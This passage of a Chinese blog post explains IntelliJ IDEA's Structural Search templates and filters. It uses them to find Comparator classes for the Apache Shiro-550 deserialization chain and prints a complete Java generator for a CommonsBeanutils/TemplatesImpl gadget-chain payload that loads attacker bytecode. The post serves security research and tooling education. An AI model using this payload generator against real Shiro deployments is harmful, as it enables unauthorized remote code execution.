+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">$A$</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">class</span> <span class="nc">$B$</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样写是没有问题的</p>
+<h4 id="template-过滤器">Template 过滤器</h4>
+<blockquote>
+<ul>
+<li><em><strong>这里是重点</strong></em></li>
+</ul>
+</blockquote>
+<p>但是一般来说，只有基本的<code>Template</code>框架配合一些变量，也只达到正则匹配的低配版，核心的部分在于**<code>Template</code>过滤器**</p>
+<p>双击变量，选中后点击右上角的<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/app-client.expui.general.filter.svg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="1"
+	
+	
+>图标，可以进入下图，点击加号可以添加过滤规则</p>
+<blockquote>
+<p>官方写的是<em><strong>Modifier</strong></em>，我理解是修饰语，用于给变量做限定。但面向小白，翻译为了过滤规则</p>
+</blockquote>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418131841946.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418131841946"
+	
+	
+></p>
+<p>关于过滤器与过滤规则你需要知道：</p>
+<ul>
+<li>过滤规则是针对<em><strong>变量</strong></em>或者<em><strong>变量的组合</strong></em>来进行编辑的</li>
+<li>所有的过滤规则组成了该变量的<em><strong>过滤器</strong></em></li>
+<li><em><strong>不同种类的变量</strong></em>可以添加的<em><strong>过滤规则种类不一定相同</strong></em></li>
+<li><em><strong>变量的种类</strong></em>取决于该变量在<code>Template</code>框架中的位置（也就是按照<code>Java</code>语法来解析<a class="link" href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9"  target="_blank" rel="noopener"
+    >AST</a>以确认他的类型）</li>
+</ul>
+<p>过滤规则包含以下几类</p>
+<h5 id="text">Text</h5>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418133952823.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418133952823"
+	
+	
+></p>
+<ol>
+<li>可以用以确认该变量的类型，可以是<em><strong>全限定类名</strong></em>或者<code>Object</code>（目前官方给出的）
+<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418135252347.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418135252347"
+	
+	
+>Object示例
+<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418135859872.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418135859872"
+	
+	
+></li>
+<li>可以用以确认该变量的字符串匹配（支持<em><strong>正则表达式</strong></em>）
+<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418134915900.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418134915900"
+	
+	
+></li>
+</ol>
+<h6 id="within-type-hierarchy">Within type hierarchy</h6>
+<blockquote>
+<p>选择 Within type hierarchy 选项，可以将间接实现 XXX 的类包含在搜索中。如果未选择此选项，则仅包含直接实现 Cloneable 的类。</p>
+</blockquote>
+<p>所以一般来说建议开启</p>
+<h5 id="count">Count</h5>
+<p>用于计数，可以看指定变量出现了多少次</p>
+<blockquote>
+<p>注意，包含默认次数，有些变量类型的默认次数为<code>Unlimited</code>。</p>
+<p>不符合要求会报错提示</p>
+</blockquote>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418140508942.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418140508942"
+	
+	
+></p>
+<p>示例：</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418140529617.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418140529617"
+	
+	
+></p>
+<p>不指定参数数量的方法搜索</p>
+<h5 id="reference">Reference</h5>
+<p>这个就很高级了，我这里给出官方案例的演示吧</p>
+<p>首先匹配任意方法调用</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418141747854.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418141747854"
+	
+	
+></p>
+<p>再给<code>$MethodCall$</code>添加过滤条件，为注解过的函数</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418141842220.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418141842220"
+	
+	
+></p>
+<p>搜索结果如下</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418142403282.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418142403282"
+	
+	
+></p>
+<h6 id="invert-modifier">Invert modifier</h6>
+<p>反转选择，否定</p>
+<p>在上方的例子中，如果选择了<code>Annotated methods</code>，再开启此选项，匹配的是<em><strong>没有注解</strong></em>的任意方法</p>
+<h5 id="script">Script</h5>
+<p>给个例子感受一下</p>
+<ul>
+<li>例如需要找指定类类中所有方法，该变量不是接口类，不是枚举类，不是记录类~~？~~</li>
+</ul>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418114603971.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418114603971"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">!</span><span class="n">__context__</span><span class="o">.</span><span class="n">interface</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">__context__</span><span class="o">.</span><span class="k">enum</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">__context__</span><span class="o">.</span><span class="n">record</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至于有哪些可用的，可能需要参考GroovyScript</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418143540870.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418143540870"
+	
+	
+></p>
+<h5 id="type">Type</h5>
+<p>可用指定变量的类型</p>
+<ul>
+<li>如果一个变量可同时使用<code>Type</code>和<code>Text</code>进行过滤，此时<code>Text</code><em><strong>只用作</strong></em>目标字符串的匹配（可以使用正则表达式）</li>
+</ul>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418143931255.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418143931255"
+	
+	
+></p>
+<h3 id="bar-under-the-editor-area">Bar Under the Editor Area</h3>
+<p>这一块的功能解析</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418144640571.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418144640571"
+	
+	
+></p>
+<h4 id="target">Target</h4>
+<p>选择要匹配的对象，GIF FYI</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/202504181455284.gif"
+	
+	
+	
+	loading="lazy"
+	
+		alt="2025年4月18日145426"
+	
+	
+></p>
+<h4 id="injected-code">Injected code</h4>
+<p>如果选中此项，注入的代码（例如注入到HTML代码中的JavaScript，或Java中的SQL注入）将成为搜索过程的一部分。</p>
+<h4 id="match-case">Match case</h4>
+<p>大小写匹配</p>
+<h4 id="scan-scope">Scan Scope</h4>
+<p>扫描范围的限制，分为</p>
+<ul>
+<li>In Project：在当前项目中扫描</li>
+<li>Module：指定模块进行扫描（比<code>In Project</code>精细）</li>
+<li>Directory：指定扫描目录</li>
+<li>Scope：更精细的控制（可以设置添加远程地址）
+<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/202504181459617.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418145919547"
+	
+	
+></li>
+</ul>
+<h1 id="practical-cases">Practical Case<del>s</del></h1>
+<p>需求如<a class="link" href="#before-all" >这里</a></p>
+<p><code>Tamplate</code>如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">$A$</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">$Interface1$</span><span class="p">,</span><span class="n">$Interface2$</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$Interface1$:text = java\.util\.Comparator (Within type hierarchy)</code></p>
+<p><code>$Interface2$:text = java\.io\.Serializable (Within type hierarchy)</code></p>
+<p>下图为使用结果，经过简单的筛选之后就只剩下13个了，很有帮助 <del>至少留下来的都是符合基本要求的</del></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250417200311357.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250417200311357"
+	
+	
+></p>
+<p>可以看到上图中包含了在<code>Shiro550 CB</code>链中，师傅们提到用到的<code>BeanComparator</code>，P神用的<code>CaseInsensitiveComparator</code>，还有其他的合适的类</p>
+<p>初步尝试，第一个也是OK的，下方代码33行最后</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.govuln.shiroattack</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.comparators.BooleanComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Comparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyCommonsBeanutils1Shiro</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">getPayload</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">clazzBytes</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">clazzBytes</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">(</span><span class="s">&#34;class&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Comparator</span><span class="w"> </span><span class="n">booleanComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BooleanComparator</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">booleanComparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;comparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">comparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;property&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;comparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AttrCompare</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;queue&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">obj</span><span class="p">,</span><span class="n">obj</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ==================</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 生成序列化字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">barr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="when-to-use-it">When to use it</h1>
+<ul>
+<li><strong>接口实现交叉查询</strong>或<strong>单接口查询时需要排查的数量过多</strong></li>
+<li>且有明确的筛选条件去查询对象</li>
+<li>最好有比较固定格式（查询代码的话可能需要很精细地设置<code>Tamplate</code>）
+格式越固定，<code>Tamplate</code>设置越简单</li>
+</ul>
+<h1 id="after-all">After All</h1>
+<ul>
+<li>因为还没有很深度地使用，所以存在错误<em><strong>恳请纠正</strong></em></li>
+<li>改工具还提供代码替换的功能</li>
+</ul>
+<h2 id="after-after-all">After After All</h2>
+<ul>
+<li>师傅们带带我</li>
+</ul>
+<h1 id="ref">Ref</h1>
+<p><a class="link" href="https://www.jetbrains.com/help/idea/structural-search-and-replace.html"  target="_blank" rel="noopener"
+    >https://www.jetbrains.com/help/idea/structural-search-and-replace.html</a></p>
+<p><a class="link" href="https://www.jetbrains.com/help/idea/search-templates.htmls"  target="_blank" rel="noopener"
+    >https://www.jetbrains.com/help/idea/search-templates.htmls</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/idea/">IDEA</a>
+        
+            <a href="/tags/search/">Search</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/ideatomcat/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241206102953223.png" loading="lazy" data-key="IDEATomcat" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241206102953223.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">IDEA与Tomcat</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/phpsrcdebug/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241225190805331.png" loading="lazy" data-key="PhpSrcDebug" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241225190805331.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP本体的C语言源码调试</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wsltransrecord/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241225185718444.png" loading="lazy" data-key="WslTransRecord" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241225185718444.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WSL 转移记录</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/usefullmarkdowngrammar/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125133108907.png" loading="lazy" data-key="UseFullMarkDownGrammar" data-hash="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125133108907.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">一些好用的 MarkDown 语法</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/compilationprinciplebaseknowledge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">编译原理-基本知识</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 DanSec
+    </section>
+    
+    <section class="powerby">
+        
+            Dan❤Anan <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.23.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
